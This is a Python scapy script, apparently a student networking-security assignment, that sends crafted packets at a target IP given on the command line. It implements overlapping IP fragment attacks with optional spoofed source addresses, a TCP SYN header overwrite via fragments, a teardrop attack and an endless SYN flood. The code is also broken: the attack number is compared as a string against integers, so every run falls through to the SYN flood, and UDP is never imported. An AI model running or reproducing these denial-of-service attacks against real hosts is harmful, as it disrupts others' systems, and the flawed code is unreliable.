import sys
import random as rand

from scapy.layers.inet import IP, Ether, TCP, ICMP
from scapy.sendrecv import send, sendp
from scapy import *
#take ip source and destination from as input from user
dest=str(sys.argv[1])
attacknb=(sys.argv[2])
sport=rand.randint(1024,65535)
#print(dest)
#Does it make sense to spoof an ip in tcp overwriting header attack?If yes, code below
def generaterandomsrc():
    spoofip= str(rand.randint(0, 255)) + "." + str(rand.randint(0, 255)) + "." + str(rand.randint(0, 255))+ "."+ str(rand.randint(0, 255))
    return spoofip
#print(generaterandomsrc())
#two attacks, one for overlapping data and the other for overlapping TCP SYN header
#First attack

def attack1(): #overlapping data fragments
    data1="0"*8
    f1=IP(dst=dest, id=1000, flags="MF", proto=1, frag=0)/ICMP(type=8,code=0, chksum=0x123)
    f2=IP(dst=dest, id=1000, flags="MF", proto=1, frag=2)/data1
    data2="1"*24
    f3=IP(dst=dest, id=1000, flags=0, proto=1, frag=1)/data2
    send(f1)
    send(f2)
    send(f3)
def attack1spoof():
    data1 = "0" * 8
    f1 = IP(src=generaterandomsrc(), dst=dest, id=1000, flags="MF", proto=1, frag=0)/ICMP(type=8, code=0, chksum=0x123)
    f2 = IP(src=generaterandomsrc(), dst=dest, id=1000, flags="MF", proto=1, frag=2)/data1
    data2 = "1" * 24
    f3 = IP(src=generaterandomsrc(), dst=dest, id=1000, flags=0, proto=1, frag=1)/data2
    send(f1)
    send(f2)
    send(f3)
def attack2(): #from pdf on moodle; overlapping to establish a connection and overwrite SYN flag
    f1 = IP(dst=dest, id=1, proto=1, frag=0, flags="MF")/TCP(sport=sport, dport=80, seq=100, ack='1') #flags='A')#SYN=0??
    f2 = IP(dst=dest, id=1, proto=1, frag=1, flags=0)/ TCP(sport=sport, dport=80, seq=101, flags='S', ack='0')
    send(f1)
    send(f2)

def attack3(): #fromslide explanation of fragmentation
    payload="ATTACK"*20
    payload2="0"*8
    f1 = IP(dst=dest, id=1, proto=1, frag=0, flags=1)/TCP(sport=sport, dport=25, seq=100, flags="S")/payload
    f2 = IP(dst=dest, id=1, proto=1, frag=0, flags=1) /TCP(dport=21, seq=100)/payload2 #increment?acknowledgement?
    f3 = IP(dst=dest, id=1, proto=1, frag=2, flags=0)
    send(f1)
    send(f2)
    send(f3)
def teardrop():#teardrop based on class explanation
    data1="0"*800
    data2= "0"*100
    f1=IP(dst=dest, id=1000, flags="MF", proto=1, frag=0)/UDP(dport=80)/data1
    f2=IP(dst=dest, id=1000, flags=0, proto=1, frag=2)/data2
    send(f1)
    send(f2)
#Synflood
def synflood():
    while True:
        sendp(Ether()/IP(dst=dest)/TCP(sport=sport, dport=80, flags='S'), inter=0.001)
if attacknb==0:
    print("Running overlapping fragmentation attack on data from your ip source")
    attack1()
elif attacknb==1:
    print("Running overlapping fragmentation attack on data from spoofed ip source")
    attack1spoof()
elif attacknb==2:
    print ("Running overlapping fragmentation attack on TCP SYN header")
    attack2()
elif attacknb==3:
    attack3()
elif attacknb==4:
    teardrop()
else:

    #calling function is giving infinite loop, if we just add the cases like commented below it works
    #ignore comments below these are from attack 1 to test 
    #data1 = "0" * 8
    #f1 = IP(dst=dest, id=1000, flags="MF", proto=1, frag=0) / ICMP(type=8, code=0, chksum=0x123)
    #f2 = IP(dst=dest, id=1000, flags="MF", proto=1, frag=2) / data1
    #data2 = "1" * 24
    #f3 = IP(dst=dest, id=1000, flags=0, proto=1, frag=1) / data2
    #send(f1)
    #send(f2)
    #send(f3)
    #test=IP(dst=dest)/TCP()
    #send(test)
    synflood()

###syn flood if we changed our mind
def synflood():
    while True:
        sendp(Ether() / IP(dst=dest) / TCP(sport=sport, dport=80, flags='S'), inter=0.001)